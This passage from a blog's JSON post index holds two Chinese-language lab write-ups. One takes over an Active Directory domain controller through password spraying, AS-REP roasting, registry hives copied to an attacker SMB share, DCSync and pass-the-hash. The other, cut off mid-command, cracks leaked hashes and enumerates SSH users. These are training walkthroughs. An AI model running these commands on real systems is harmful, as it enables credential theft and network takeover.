"https://github.com/7r1UMPHK/7r1UMPHK.github.io/issues/240", "commentNum": 0, "wordCount": 9135, "description": "# \u4e00\u3001\u4fe1\u606f\u6536\u96c6\n\n## \u4e3b\u673a\u53d1\u73b0\n\n\u4f7f\u7528arp-scan\u626b\u63cf\u672c\u5730\u7f51\u6bb5\uff0c\u53d1\u73b0\u76ee\u6807\u4e3b\u673a\uff1a\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ sudo arp-scan -l\n...\n192.168.205.146 08:00:27:ae:b5:53       PCS Systemtechnik GmbH\n...\n```\n\n\u786e\u5b9a\u76ee\u6807IP\uff1a`192.168.205.146`\n\n## \u7aef\u53e3\u626b\u63cf\n\n\u4f7f\u7528rustscan\u5bf9\u76ee\u6807\u8fdb\u884c\u5168\u7aef\u53e3\u626b\u63cf\uff1a\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ rustscan -a 192.168.205.146\n...\nOpen 192.168.205.146:53\nOpen 192.168.205.146:88\nOpen 192.168.205.146:135\nOpen 192.168.205.146:139\nOpen 192.168.205.146:389\nOpen 192.168.205.146:445\nOpen 192.168.205.146:464\nOpen 192.168.205.146:593\nOpen 192.168.205.146:636\nOpen 192.168.205.146:3268\nOpen 192.168.205.146:3269\nOpen 192.168.205.146:5985\nOpen 192.168.205.146:9389\n```\n\n\u4ece\u5f00\u653e\u7aef\u53e3\u53ef\u4ee5\u5224\u65ad\u8fd9\u662f\u4e00\u53f0Windows\u57df\u63a7\u5236\u5668\uff0c\u5173\u952e\u670d\u52a1\u5305\u62ec\uff1a\n\n- 53: DNS\u670d\u52a1\n- 88: Kerberos\u8ba4\u8bc1\u670d\u52a1\n- 389/636: LDAP/LDAPS\n- 445: SMB\u670d\u52a1\n- 5985: WinRM\u670d\u52a1\n\n## SMB\u4fe1\u606f\u6536\u96c6\n\n\u4f7f\u7528enum4linux-ng\u8fdb\u884cSMB\u679a\u4e3e\uff1a\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ enum4linux-ng -A 192.168.205.146\n...\n[+] Long domain name is: SOUPEDECODE.LOCAL\n[+] Got domain/workgroup name: SOUPEDECODE\n[+] Full NetBIOS names information:\n- DC01            <00> -         M <ACTIVE>  Workstation Service\n- SOUPEDECODE     <1c> - <GROUP> M <ACTIVE>  Domain Controllers\n...\n```\n\n\u83b7\u53d6\u91cd\u8981\u4fe1\u606f\uff1a\n\n- \u57df\u540d\uff1a`SOUPEDECODE.LOCAL`\n- \u57df\u63a7\u5236\u5668\u4e3b\u673a\u540d\uff1a`DC01`\n- FQDN\uff1a`DC01.SOUPEDECODE.LOCAL`\n- \u65e0\u533f\u540d\u767b\u5f55\n\n\u5c06\u57df\u540d\u6dfb\u52a0\u5230hosts\u6587\u4ef6\uff1a\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ echo '192.168.205.146 SOUPEDECODE.LOCAL' >> /etc/hosts\n```\n\n## \u6f0f\u6d1e\u626b\u63cf\n\n\u4f7f\u7528nmap\u6f0f\u6d1e\u626b\u63cf\u811a\u672c\u68c0\u6d4bSMB\u76f8\u5173\u6f0f\u6d1e\uff1a\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ nmap --script=vuln -p445,139 192.168.205.146 \n...\n|_smb-vuln-ms10-054: false\n|_smb-vuln-ms10-061: Could not negotiate a connection:SMB: Failed to receive bytes: ERROR\n...\n```\n\n\u672a\u53d1\u73b0\u53ef\u5229\u7528\u7684SMB\u6f0f\u6d1e\u3002\n\n## LDAP\u4fe1\u606f\u6536\u96c6\n\n\u5c1d\u8bd5\u533f\u540d\u7ed1\u5b9aLDAP\u670d\u52a1\uff1a\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ ldapsearch -H ldap://192.168.205.146 -x -b 'dc=soupedecode,dc=local'\n...\nresult: 1 Operations error\ntext: 000004DC: LdapErr: DSID-0C090A58, comment: In order to perform this operation a successful bind must be completed on the connection.\n...\n```\n\nLDAP\u670d\u52a1\u62d2\u7edd\u533f\u540d\u67e5\u8be2\uff0c\u9700\u8981\u6709\u6548\u51ed\u636e\u3002\n\n# \u4e8c\u3001\u7528\u6237\u679a\u4e3e\n\n\u4f7f\u7528kerbrute\u5de5\u5177\u679a\u4e3e\u57df\u7528\u6237\uff1a\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ kerbrute userenum --dc 192.168.205.146 -d soupedecode.local /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt -t 64\n...\n2025/09/03 13:39:39 >  [+] VALID USERNAME:       admin@soupedecode.local\n2025/09/03 13:39:39 >  [+] VALID USERNAME:       charlie@soupedecode.local\n2025/09/03 13:39:39 >  [+] VALID USERNAME:       administrator@soupedecode.local\n...\n```\n\n\u53d1\u73b0\u6709\u6548\u7528\u6237\u540d\uff1a\n\n- admin\n- charlie\n- administrator\n\n# \u4e09\u3001\u5bc6\u7801\u7206\u7834\n\n## SMB\u5bc6\u7801\u7206\u7834\n\n\u4f7f\u7528crackmapexec\u5bf9\u53d1\u73b0\u7684\u7528\u6237\u8fdb\u884c\u5bc6\u7801\u55b7\u6d12\u653b\u51fb\uff1a\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ crackmapexec smb 192.168.205.146 -u user -p user --continue-on-success| grep '+'\nSMB                      192.168.205.146 445    DC01             [+] SOUPEDECODE.LOCAL\\charlie:charlie \n```\n\n\u6210\u529f\u83b7\u5f97\u4e00\u7ec4\u6709\u6548\u51ed\u636e\uff1a`charlie:charlie`\n\n## \u9a8c\u8bc1\u6743\u9650\n\n\u4f7f\u7528\u83b7\u5f97\u7684\u51ed\u636e\u67e5\u770bSMB\u5171\u4eab\u6743\u9650\uff1a\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ nxc smb 192.168.205.146 -u charlie -p charlie --shares\n...\nSMB         192.168.205.146 445    DC01             Share           Permissions     Remark\nSMB         192.168.205.146 445    DC01             -----           -----------     ------\nSMB         192.168.205.146 445    DC01             ADMIN$                          Remote Admin\nSMB         192.168.205.146 445    DC01             C$                              Default share\nSMB         192.168.205.146 445    DC01             IPC$            READ            Remote IPC\nSMB         192.168.205.146 445    DC01             NETLOGON        READ            Logon server share \nSMB         192.168.205.146 445    DC01             SYSVOL          READ            Logon server share\n```\n\ncharlie\u7528\u6237\u53ea\u6709\u6807\u51c6\u7684\u57df\u7528\u6237\u6743\u9650\uff0c\u65e0\u6cd5\u8bbf\u95ee\u654f\u611f\u5171\u4eab\u3002\n\n# \u56db\u3001\u57df\u7528\u6237\u8fdb\u4e00\u6b65\u679a\u4e3e\n\n## RID\u7206\u7834\n\n\u4f7f\u7528charlie\u7528\u6237\u7684\u51ed\u636e\u8fdb\u884cRID\u7206\u7834\uff0c\u83b7\u53d6\u66f4\u591a\u7528\u6237\u4fe1\u606f\uff1a\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ nxc smb 192.168.205.146 -u charlie -p charlie --rid-brute|awk -F '\\' '{print $2}'|awk '{print $1}' > user\n```\n\n## Kerberoasting\u653b\u51fb\n\n\u4f7f\u7528GetNPUsers\u5de5\u5177\u68c0\u67e5\u662f\u5426\u6709\u7528\u6237\u8bbe\u7f6e\u4e86'\u4e0d\u8981\u6c42Kerberos\u9884\u8ba4\u8bc1'\u5c5e\u6027\uff1a\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ impacket-GetNPUsers -usersfile user -dc-ip 192.168.205.146 'SOUPEDECODE.LOCAL/charlie:charlie' |grep -v '-'\n\n$krb5asrep$23$zximena448@SOUPEDECODE.LOCAL:658c87a58d98ac6611635ed17f2dde44$dca073223197802e16eda82933c8edf55b906146cf6eb9ba9e5ff4c3dff4a74d70a91b8787a8a12dd5a85196534f86252203f806f02793903578d5d42c2f4df593c749f6a47f81011356b05caee386f1610848d1a1e92fa79504b988bed455e8e973f720203ac48e13398cd103a0e719bacf3e880591e0aab24a4f191832bb948fe7f5fcd3b17e16302998e592387ae5a25c6c8b8a5566f2b2aa7cd6e26e392c06e7877069df8736662a357aba9edf69cc5b294af97a3af3df6350db9ba829a98ef293de9f10242642e8dab8c55e8024d26c98b7ae9c12a9ff9a0c4afc52f97e765569d0ab540c80505536cade0fce31973c6854507d\n```\n\n\u53d1\u73b0\u7528\u6237`zximena448`\u5b58\u5728AS-REP Roasting\u6f0f\u6d1e\uff0c\u83b7\u5f97Kerberos\u7968\u636e\u54c8\u5e0c\u3002\n\n## \u54c8\u5e0c\u7834\u89e3\n\n\u4f7f\u7528john\u5de5\u5177\u7834\u89e3AS-REP\u54c8\u5e0c\uff1a\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ john --wordlist=/usr/share/wordlists/rockyou.txt hash \n...\ninternet         ($krb5asrep$23$zximena448@SOUPEDECODE.LOCAL)   \n...\n```\n\n\u6210\u529f\u7834\u89e3\u5bc6\u7801\uff1a`zximena448:internet`\n\n# \u4e94\u3001\u6743\u9650\u63d0\u5347\n\n## \u9a8c\u8bc1\u65b0\u51ed\u636e\n\n\u4f7f\u7528\u65b0\u83b7\u5f97\u7684\u51ed\u636e\u6d4b\u8bd5\u6743\u9650\uff1a\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ nxc smb 192.168.205.146 -u zximena448 -p internet --shares   \n...\nSMB         192.168.205.146 445    DC01             Share           Permissions     Remark\nSMB         192.168.205.146 445    DC01             -----           -----------     ------\nSMB         192.168.205.146 445    DC01             ADMIN$          READ            Remote Admin\nSMB         192.168.205.146 445    DC01             C$              READ,WRITE      Default share\n...\n```\n\nzximena448\u7528\u6237\u5177\u6709\u66f4\u9ad8\u6743\u9650\uff0c\u53ef\u4ee5\u8bbf\u95eeADMIN$\u548cC$\u5171\u4eab\u3002\n\n## LDAP\u8be6\u7ec6\u679a\u4e3e\n\n\u4f7f\u7528ldapdomaindump\u5de5\u5177\u8fdb\u884c\u8be6\u7ec6\u7684LDAP\u4fe1\u606f\u6536\u96c6\uff1a\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x/tmp]\n\u2514\u2500$ python3 /usr/lib/python3/dist-packages/ldapdomaindump -u 'SOUPEDECODE.LOCAL\\zximena448' -p 'internet' 192.168.205.146\n[*] Connecting to host...\n[*] Binding to host\n[+] Bind OK\n[*] Starting domain dump\n[+] Domain dump finished\n```\n\n\u901a\u8fc7\u67e5\u770b\u751f\u6210\u7684HTML\u62a5\u544a\uff0c\u53d1\u73b0zximena448\u7528\u6237\u662f**Backup Operators**\u7ec4\u7684\u6210\u5458\u3002\n\n## Backup Operators\u6743\u9650\u5229\u7528\n\nBackup Operators\u662fWindows\u7684\u5185\u7f6e\u7ec4\uff0c\u8be5\u7ec4\u6210\u5458\u5177\u6709SeBackupPrivilege\u7279\u6743\uff0c\u53ef\u4ee5\u8bfb\u53d6\u57df\u63a7\u5236\u5668\u4e0a\u7684\u654f\u611f\u6587\u4ef6\uff0c\u5305\u62ecSAM\u6570\u636e\u5e93\u3002\n\n### \u8bbe\u7f6eSMB\u670d\u52a1\u5668\n\n\u5728\u653b\u51fb\u673a\u4e0a\u542f\u52a8SMB\u670d\u52a1\u5668\u63a5\u6536\u5907\u4efd\u6587\u4ef6\uff1a\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x/tmp]\n\u2514\u2500$ impacket-smbserver share . -smb2support\n[*] Config file parsed\n[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0\n...\n```\n\n### \u5907\u4efd\u6ce8\u518c\u8868\n\n\u5229\u7528SeBackupPrivilege\u7279\u6743\u5907\u4efdSAM\u3001SYSTEM\u548cSECURITY\u6ce8\u518c\u8868\uff1a\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ impacket-reg 'zximena448:internet@192.168.205.146' backup -o '\\\\192.168.205.128\\share'\n[!] Cannot check RemoteRegistry status. Triggering start trough named pipe...\n[*] Saved HKLM\\SAM to \\\\192.168.205.128\\share\\SAM.save\n[*] Saved HKLM\\SYSTEM to \\\\192.168.205.128\\share\\SYSTEM.save\n[*] Saved HKLM\\SECURITY to \\\\192.168.205.128\\share\\SECURITY.save\n```\n\n### \u63d0\u53d6\u672c\u5730\u54c8\u5e0c\n\n\u4f7f\u7528secretsdump\u5de5\u5177\u4ece\u5907\u4efd\u7684\u6ce8\u518c\u8868\u6587\u4ef6\u4e2d\u63d0\u53d6\u5bc6\u7801\u54c8\u5e0c\uff1a\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x/tmp]\n\u2514\u2500$ impacket-secretsdump -sam SAM.save -system SYSTEM.save -security SECURITY.save LOCAL\n...\n[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)\nAdministrator:500:aad3b435b51404eeaad3b435b51404ee:209c6174da490caeb422f3fa5a7ae634:::\n...\n[*] $MACHINE.ACC \n...\n$MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:aa905227fd1b4142a01a09912606af5c\n...\n```\n\n\u83b7\u5f97\u673a\u5668\u8d26\u6237`DC01$`\u7684NTLM\u54c8\u5e0c\uff1a`aa905227fd1b4142a01a09912606af5c`\n\n## DCSync\u653b\u51fb\n\n### \u9a8c\u8bc1\u673a\u5668\u8d26\u6237\u6743\u9650\n\n\u4f7f\u7528\u673a\u5668\u8d26\u6237\u54c8\u5e0c\u9a8c\u8bc1\u6743\u9650\uff1a\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ nxc smb 192.168.205.146 -u 'DC01$' -H 'aa905227fd1b4142a01a09912606af5c' --ntds\n[+] Dumping the NTDS, this could take a while so go grab a redbull...\nSMB         192.168.205.146 445    DC01             Administrator:500:aad3b435b51404eeaad3b435b51404ee:8982babd4da89d33210779a6c5b078bd:::\nSMB         192.168.205.146 445    DC01             Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\nSMB         192.168.205.146 445    DC01             krbtgt:502:aad3b435b51404eeaad3b435b51404ee:fb9d84e61e78c26063aced3bf9398ef0:::\nSMB         192.168.205.146 445    DC01             soupedecode.local\\bmark0:1103:aad3b435b51404eeaad3b435b51404ee:d72c66e955a6dc0fe5e76d205a630b15:::\n```\n\n\u6210\u529f\u6267\u884cDCSync\u653b\u51fb\uff0c\u83b7\u5f97\u57df\u5185\u6240\u6709\u7528\u6237\u7684\u5bc6\u7801\u54c8\u5e0c\uff0c\u5305\u62ec\u57df\u7ba1\u7406\u5458Administrator\u7684NTLM\u54c8\u5e0c\uff1a`8982babd4da89d33210779a6c5b078bd`\n\n# \u516d\u3001\u83b7\u53d6\u57df\u7ba1\u6743\u9650\n\n\u4f7f\u7528\u57df\u7ba1\u7406\u5458\u7684NTLM\u54c8\u5e0c\u8fdb\u884cPass-the-Hash\u653b\u51fb\uff1a\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ evil-winrm -i 192.168.205.146 -u Administrator -H '8982babd4da89d33210779a6c5b078bd'       \n                                      \nEvil-WinRM shell v3.7\n...\n*Evil-WinRM* PS C:\\Users\\Administrator\\Documents> whoami\nsoupedecode\\administrator\n```\n\n\u6210\u529f\u83b7\u5f97\u57df\u7ba1\u7406\u5458\u6743\u9650\u3002\n\n## \u83b7\u53d6flag\n\n```bash\n*Evil-WinRM* PS C:\\Users> type C:\\Users\\Administrator\\Desktop\\root.txt\nd41d8cd98f00b204e9800998ecf8427e\n\n*Evil-WinRM* PS C:\\Users> type C:\\Users\\zximena448\\Desktop\\user.txt\n2fe79eb0e02ecd4dd2833cfcbbdb504c\n```\n\n# \u4e03\u3001\u653b\u51fb\u603b\u7ed3\n\n\u672c\u6b21\u6e17\u900f\u6d4b\u8bd5\u7684\u653b\u51fb\u8def\u5f84\u5982\u4e0b\uff1a\n\n1. **\u4fe1\u606f\u6536\u96c6**\uff1a\u901a\u8fc7\u7aef\u53e3\u626b\u63cf\u548c\u670d\u52a1\u679a\u4e3e\uff0c\u8bc6\u522b\u76ee\u6807\u4e3aWindows\u57df\u63a7\u5236\u5668\n2. **\u7528\u6237\u679a\u4e3e**\uff1a\u4f7f\u7528kerbrute\u5de5\u5177\u679a\u4e3e\u6709\u6548\u57df\u7528\u6237\n3. **\u51ed\u636e\u83b7\u53d6**\uff1a\u901a\u8fc7\u5bc6\u7801\u55b7\u6d12\u653b\u51fb\u83b7\u5f97charlie\u7528\u6237\u51ed\u636e\n4. **AS-REP Roasting**\uff1a\u53d1\u73b0zximena448\u7528\u6237\u5b58\u5728Kerberos\u9884\u8ba4\u8bc1\u6f0f\u6d1e\uff0c\u7834\u89e3\u83b7\u5f97\u5bc6\u7801\n5. **\u6743\u9650\u63d0\u5347**\uff1a\u5229\u7528zximena448\u7528\u6237\u7684Backup Operators\u6743\u9650\u5907\u4efd\u6ce8\u518c\u8868\n6. **\u6a2a\u5411\u79fb\u52a8**\uff1a\u63d0\u53d6\u673a\u5668\u8d26\u6237\u54c8\u5e0c\uff0c\u6267\u884cDCSync\u653b\u51fb\n7. **\u57df\u7ba1\u63a5\u7ba1**\uff1a\u4f7f\u7528\u57df\u7ba1\u7406\u5458\u54c8\u5e0c\u83b7\u5f97\u5b8c\u5168\u63a7\u5236\u6743\u9650\n\n**\u5173\u952e\u77e5\u8bc6\u70b9**\uff1a\n\n- **Backup Operators\u7ec4**\uff1a\u8be5\u7ec4\u6210\u5458\u5177\u6709SeBackupPrivilege\u7279\u6743\uff0c\u53ef\u4ee5\u5907\u4efd\u548c\u8fd8\u539f\u6587\u4ef6\uff0c\u5305\u62ec\u654f\u611f\u7684\u7cfb\u7edf\u6587\u4ef6\n- **AS-REP Roasting**\uff1a\u9488\u5bf9\u8bbe\u7f6e\u4e86'\u4e0d\u8981\u6c42Kerberos\u9884\u8ba4\u8bc1'\u5c5e\u6027\u7684\u7528\u6237\u8d26\u6237\u7684\u653b\u51fb\u6280\u672f\n- **DCSync\u653b\u51fb**\uff1a\u5229\u7528\u57df\u63a7\u5236\u5668\u6743\u9650\u540c\u6b65\u6574\u4e2a\u57df\u6570\u636e\u5e93\u7684\u9ad8\u7ea7\u653b\u51fb\u6280\u672f\n- **Pass-the-Hash**\uff1a\u65e0\u9700\u660e\u6587\u5bc6\u7801\uff0c\u76f4\u63a5\u4f7f\u7528NTLM\u54c8\u5e0c\u8fdb\u884c\u8eab\u4efd\u9a8c\u8bc1\u7684\u6280\u672fsentence", "top": 0, "createdAt": 1756967116, "style": "", "script": "</script><script src='https://7r1UMPHK.github.io/plugins/TOC.js'></script><script src='https://7r1UMPHK.github.io/plugins/lightbox.js'></script><script src='https://7r1UMPHK.github.io/plugins/LazyLoadImages.js'></script>", "head": "", "ogImage": "https://7r1umphk.github.io/image/20250716100121947.webp", "createdDate": "2025-09-04", "dateLabelColor": "#0969da"}, "P241": {"htmlDir": "docs/post/nei-bu-_Poppins.html", "labels": ["\u5185\u90e8\u9776\u673a/maze-sec"], "postTitle": "\u5185\u90e8_Poppins", "postUrl": "post/nei-bu-_Poppins.html", "postSourceUrl": "https://github.com/7r1UMPHK/7r1UMPHK.github.io/issues/241", "commentNum": 0, "wordCount": 7962, "description": "# \u4e00\u3001\u4fe1\u606f\u6536\u96c6 \n\n\u4f7f\u7528 arp-scan \u626b\u63cf\u5c40\u57df\u7f51\u4e2d\u7684\u4e3b\u673a\uff1a\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ sudo arp-scan -l\n...\n192.168.205.143 08:00:27:77:42:bb       PCS Systemtechnik GmbH\n...\n```\n\n\u53d1\u73b0\u76ee\u6807\u4e3b\u673a\uff1a`192.168.205.143`\n\n## \u7aef\u53e3\u626b\u63cf\n\n\u5bf9\u76ee\u6807\u4e3b\u673a\u8fdb\u884c\u5168\u7aef\u53e3\u626b\u63cf\uff1a\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ nmap -p0-65535 192.168.205.143\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-09-02 15:20 EDT\nNmap scan report for 192.168.205.143\nHost is up (0.000089s latency).\nNot shown: 65532 closed tcp ports (reset)\nPORT    STATE SERVICE\n22/tcp  open  ssh\n80/tcp  open  http\n110/tcp open  pop3\n995/tcp open  pop3s\n```\n\n\u53d1\u73b0\u56db\u4e2a\u5f00\u653e\u7aef\u53e3\uff1a\n\n- **22/tcp**: SSH\u670d\u52a1\n- **80/tcp**: HTTP\u670d\u52a1\n- **110/tcp**: POP3\u670d\u52a1\n- **995/tcp**: POP3S\u670d\u52a1\n\n# \u4e8c\u3001Web\u670d\u52a1\u63a2\u6d4b\n\n\u8bbf\u95ee80\u7aef\u53e3\u53d1\u73b0\u662f\u4e00\u4e2a\u7535\u5f71\u4ecb\u7ecd\u9875\u9762\uff0c\u5305\u542b\u4e00\u4e9b\u4eba\u540d\u4fe1\u606f\u3002\n\n## \u76ee\u5f55\u679a\u4e3e\n\n\u4f7f\u7528 dirsearch \u8fdb\u884c\u76ee\u5f55\u626b\u63cf\uff1a\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ dirsearch -u 192.168.205.143        \n...\n[15:23:04] 301 -  314B  - /s  ->  http://192.168.205.143/s/\n...\n```\n\n\u53d1\u73b0 `/s` \u76ee\u5f55\uff0c\u7ee7\u7eed\u6df1\u5165\u63a2\u6d4b\u3002\n\n## \u6df1\u5ea6\u76ee\u5f55\u7206\u7834\u7684\u601d\u8def\n\n\u8fd9\u91cc\u6709\u4e2a\u5173\u952e\u7684\u601d\u8def\u8f6c\u6362\uff1a\u5f53\u53d1\u73b0\u53ea\u6709\u4e00\u4e2a `/s` \u76ee\u5f55\u65f6\uff0c\u6211\u60f3\u5230\u8fd9\u53ef\u80fd\u4e0d\u662f\u666e\u901a\u7684\u76ee\u5f55\u7ed3\u6784\u3002\u7ed3\u5408\u8fd9\u662fSublarge\u51fa\u7684\u9776\u673a\uff0c\u6211\u8bb0\u5f97\u4e4b\u524d\u505a\u8fc7\u7c7b\u4f3c\u7684\u9898\u76ee\uff0c\u6709\u4e9b\u9776\u673a\u4f1a\u628aSSH\u79c1\u94a5\u6216\u91cd\u8981\u6587\u4ef6\u85cf\u5728\u5f88\u6df1\u7684\u76ee\u5f55\u8def\u5f84\u4e2d\u3002\n\n\u65e2\u7136\u53ea\u53d1\u73b0\u4e86\u5b57\u6bcd `s`\uff0c\u90a3\u5f88\u53ef\u80fd\u662f\u6309\u5b57\u6bcd\u9010\u5c42\u6784\u5efa\u7684\u6df1\u5c42\u76ee\u5f55\u3002\u4e8e\u662f\u6211\u51b3\u5b9a\u7528\u5355\u5b57\u6bcd\u4f5c\u4e3a\u5b57\u5178\u8fdb\u884c\u9012\u5f52\u7206\u7834\uff1a\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x/tmp]\n\u2514\u2500$ printf '%s\\n' {a..z} > a.txt                                       \n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x/tmp]\n\u2514\u2500$ printf '%s\\n' {A..Z} >> a.txt\n```\n\n\u521b\u5efa\u5305\u542b\u6240\u6709\u5927\u5c0f\u5199\u5b57\u6bcd\u7684\u5b57\u5178\u6587\u4ef6\uff0c\u7136\u540e\u4f7f\u7528 feroxbuster \u8fdb\u884c\u6df1\u5ea6\u9012\u5f52\u626b\u63cf\uff1a\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x/tmp]\n\u2514\u2500$ feroxbuster --url http://192.168.205.143 -w a.txt -t 64 --depth 99999\n...\n301      GET        9l       28w      314c http://192.168.205.143/s => http://192.168.205.143/s/\n301      GET        9l       28w      316c http://192.168.205.143/s/u => http://192.168.205.143/s/u/\n301      GET        9l       28w      318c http://192.168.205.143/s/u/p => http://192.168.205.143/s/u/p/\n...\n301      GET        9l       28w      380c http://192.168.205.143/s/u/p/e/r/c/a/l/i/f/r/a/g/i/l/i/s/t/i/c/e/x/p/i/a/l/i/d/o/c/i/o/u/s/ => \n...\n```\n\n**\u5173\u952e\u6d1e\u5bdf**\uff1a\u8fd9\u91cc\u8bbe\u7f6e `--depth 99999` \u662f\u4e3a\u4e86\u8ba9\u5de5\u5177\u65e0\u9650\u9012\u5f52\uff0c\u76f4\u5230\u627e\u4e0d\u5230\u66f4\u591a\u76ee\u5f55\u4e3a\u6b62\u3002\u968f\u7740\u626b\u63cf\u7684\u8fdb\u884c\uff0c\u53ef\u4ee5\u770b\u5230\u8def\u5f84\u8d8a\u6765\u8d8a\u957f\uff0c\u6700\u7ec8\u63ed\u793a\u4e86\u5b8c\u6574\u7684\u5355\u8bcd\uff1a\n\n`s/u/p/e/r/c/a/l/i/f/r/a/g/i/l/i/s/t/i/c/e/x/p/i/a/l/i/d/o/c/i/o/u/s`\n\n\u8fd9\u4e2a\u8def\u5f84\u5b9e\u9645\u4e0a\u662f\u5355\u8bcd **'supercalifragilisticexpialidocious'** \u7684\u5b57\u6bcd\u5206\u89e3\uff0c\u8fd9\u662f\u7535\u5f71\u300a\u6b22\u4e50\u6ee1\u4eba\u95f4\u300b(Mary Poppins)\u4e2d\u7684\u7ecf\u5178\u5355\u8bcd\uff0c\u4e0e\u9776\u673a\u540d\u79f0'Poppins'\u547c\u5e94\u3002\n\n\u5728\u8be5\u8d85\u957f\u76ee\u5f55\u4e0b\u7ee7\u7eed\u626b\u63cf\uff1a\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x/tmp]\n\u2514\u2500$ gobuster dir -u http://192.168.205.143/s/u/p/e/r/c/a/l/i/f/r/a/g/i/l/i/s/t/i/c/e/x/p/i/a/l/i/d/o/c/i/o/u/s/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,txt,html,zip,db,bak -t 64 \n...\n/index.html           (Status: 200) [Size: 1531]\n/hash.bak             (Status: 200) [Size: 3300]\n```\n\n\u679c\u7136\u53d1\u73b0\u4e86\u5173\u952e\u6587\u4ef6 `hash.bak`\u3002\n\n# \u4e09\u3001\u54c8\u5e0c\u7834\u89e3\n\n\u4e0b\u8f7d\u5e76\u5206\u6790 hash.bak \u6587\u4ef6\uff1a\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x/tmp]\n\u2514\u2500$ curl http://192.168.205.143/s/u/p/e/r/c/a/l/i/f/r/a/g/i/l/i/s/t/i/c/e/x/p/i/a/l/i/d/o/c/i/o/u/s/hash.bak\nfcb6cc0d2a780ac022cf70ceb0d85f4c\nc63c3575b62f4944fba4879c2dd3951b\n...\n```\n\n\u6587\u4ef6\u5305\u542b100\u4e2aMD5\u54c8\u5e0c\u503c\u3002\u4f7f\u7528john\u8fdb\u884c\u7834\u89e3\uff1a\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x/tmp]\n\u2514\u2500$ john --wordlist=/usr/share/wordlists/rockyou.txt hash --format=Raw-MD5     \n...\nkent12           (?)   \namotejoel        (?)   \nsunjoo           (?)   \n...\n```\n\n\u63d0\u53d6\u7834\u89e3\u6210\u529f\u7684\u5bc6\u7801\uff1a\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x/tmp]\n\u2514\u2500$ john --show hash --format=Raw-MD5 | cut -d: -f2 | sort | uniq > pass\n```\n\n# \u56db\u3001\u7528\u6237\u540d\u6536\u96c6\u4e0eSSH\u7206\u7834\n\n## \u7528\u6237\u540d\u679a\u4e3e\n\n\u4f7f\u7528 cewl \u4ece\u4e3b\u9875\u63d0\u53d6\u53ef\u80fd\u7684\u7528\u6237\u540d\uff1a\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x/tmp]\n\u2514\u2500$ cewl http://192.168.205.143/ | tr 'A-Z' 'a-z' > user\n```\n\n\u901a\u8fc7SSH\u8fde\u63a5\u6d4b\u8bd5\uff0c\u53d1\u73b0\u7cfb\u7edf\u7684\u884c\u4e3a\u7279\u70b9\uff1a\n\n- \u5b58\u5728\u7684\u7528\u6237\u4f1a\u63d0\u793a\u8f93\u5165\u5bc6\u7801\n- \u4e0d\u5b58\u5728\u7684\u7528\u6237\u76f4\u63a5\u8fd4\u56de 'Permission denied (publickey)'\n\n\u5229\u7528\u6b64\u7279\u70b9\u679a\u4e3e\u6709\u6548\u7528\u6237\uff1a\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x/tmp]\n\u2514\u2500$ while read u; do timeout 3 ssh '$u@192.168.205.143' 2>&1 | grep -q 'publickey' || echo '$u'; done < 